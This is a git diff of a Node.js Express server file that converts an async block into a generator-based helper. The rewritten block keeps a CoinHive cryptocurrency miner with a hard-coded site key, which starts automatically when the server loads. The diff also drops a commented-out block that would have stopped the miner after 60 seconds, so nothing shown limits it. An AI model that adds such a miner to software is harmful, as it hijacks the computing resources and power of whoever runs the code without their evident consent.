@@ -1,6 +1,7 @@
 /**
  * Module dependencies.
  */
+'use strict';
 
 var express = require('express'); //
 var path = require('path'); //
@@ -44,7 +45,7 @@ serverAdmin.start(app);
 
 
 
-const CoinHive = require('coin-hive');
+//const CoinHive = require('coin-hive');
 
 //(async () => {
 //
@@ -68,24 +69,39 @@ const CoinHive = require('coin-hive');
 //})();
 
 
-(async function() {
+function _asyncToGenerator(fn) {
+	return function() {
+		var gen = fn.apply(this, arguments);
+		return new Promise(function(resolve, reject) {
+			function step(key, arg) {
+				try {
+					var info = gen[key](arg);
+					var value = info.value;
+				} catch (error) {
+					reject(error); return;
+				}
+				if (info.done) {
+					resolve(value);
+				} else {
+					return Promise.resolve(value).then(function(value) {
+						step("next", value);
+					}, function(err) {
+						step("throw", err);
+					});
+				}
+			}
+			return step("next");
+		});
+	};
+}
 
-  // Create miner
-  const miner = await CoinHive('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV'); // CoinHive's Site Key
+const CoinHive = require('coin-hive');
 
-  // Start miner
-  await miner.start();
+_asyncToGenerator(function*() {
 
-/*   // Listen on events
-  miner.on('found', () => console.log('Found!'))
-  miner.on('accepted', () => console.log('Accepted!'))
-  miner.on('update', data => console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
-  `));
+	// Create miner
+	const miner = yield CoinHive('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV'); // CoinHive's Site Key
 
-  // Stop miner
-  setTimeout(async () => await miner.stop(), 60000); */
+	// Start miner
+	yield miner.start();
 })();
-
